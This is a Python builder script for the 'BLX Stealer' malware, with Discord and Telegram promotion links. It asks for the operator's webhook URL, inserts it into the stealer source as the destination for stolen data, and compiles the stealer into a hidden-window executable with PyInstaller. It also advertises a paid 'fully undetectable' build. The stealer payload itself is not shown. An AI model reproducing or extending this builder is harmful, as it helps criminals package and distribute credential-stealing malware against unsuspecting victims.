from pystyle import *
import os
import subprocess
import requests
from colorama import *
import time

os.system('clear' if os.name == 'posix' else 'cls')

intro = """


██████╗░██╗░░░░░██╗░░██╗  ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░
██╔══██╗██║░░░░░╚██╗██╔╝  ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗
██████╦╝██║░░░░░░╚███╔╝░  ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝
██╔══██╗██║░░░░░░██╔██╗░  ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗
██████╦╝███████╗██╔╝╚██╗  ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║
╚═════╝░╚══════╝╚═╝░░╚═╝  ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝

       ╔═══════════════════════════════╗ ╔═══════════════════════════════╗
       ║ https://discord.gg/blxstealer ║ ║    https://t.me/blxstealer    ║  
       ╚═══════════════════════════════╝ ╚═══════════════════════════════╝    
                
            
            - Press Enter                                         
"""
    
Anime.Fade(Center.Center(intro), Colors.rainbow, Colorate.Vertical, interval=0.020, enter=True)


print(f"""{Fore.LIGHTRED_EX}

██████╗░██╗░░░░░██╗░░██╗  ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░
██╔══██╗██║░░░░░╚██╗██╔╝  ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗
██████╦╝██║░░░░░░╚███╔╝░  ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝
██╔══██╗██║░░░░░░██╔██╗░  ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗
██████╦╝███████╗██╔╝╚██╗  ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║
╚═════╝░╚══════╝╚═╝░░╚═╝  ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝


                    > Welcome to BLX Builder.
""")

time.sleep(1)


while True:
    
    Write.Print("\nWhich option do you want to choose: ", Colors.red)
    Write.Print("\n1. Build .exe", Colors.red)
    Write.Print("\n2. Build FUD .exe", Colors.red)
    Write.Print("\n3. Close Builder", Colors.red)
    Write.Print("\nMake your selection: ", Colors.red, end="")
    choice = input()

    if choice == "1":
        os.system("cls || clear")
        webhook = input(Fore.RED + "\nEnter Your Webhook: " + Style.RESET_ALL)

        filename = "blxstealer.py"
        filepath = os.path.join(os.getcwd(), filename)
        with open(filepath, "r", encoding="utf-8") as f:
            content = f.read()
        new_content = content.replace('"YOUR WEBHOOK HERE"', f'"{webhook}"')
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(new_content)
        Write.Print(f"\n{filename} file updated.", Colors.red)

        obfuscate = False

        while True:
            answer = input(Fore.CYAN + "\nDo you want to make exe file? (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                if not obfuscate:
                    cmd = f"pyinstaller --onefile --windowed {filename}"
                else:
                    cmd = f"pyinstaller --onefile --windowed {filename} --name {filename.split('.')[0]}"
                subprocess.call(cmd, shell=True)
                Write.Print(f"\n{filename} The file has been converted to exe.", Colors.red)
                break
            elif answer.upper() == "N":
                break
            else:
                Write.Print("\nYou have entered invalid. Please try again.", Colors.red)

    elif choice == "2":
        Write.Print("\nYou can buy FUD on our Discord server. | discord.gg/blxstealer", Colors.red)

    elif choice == "3":
        Write.Print("\nExiting the program...", Colors.red)
        break

    else:
        Write.Print("\nYou have entered invalid. Please try again.", Colors.red)
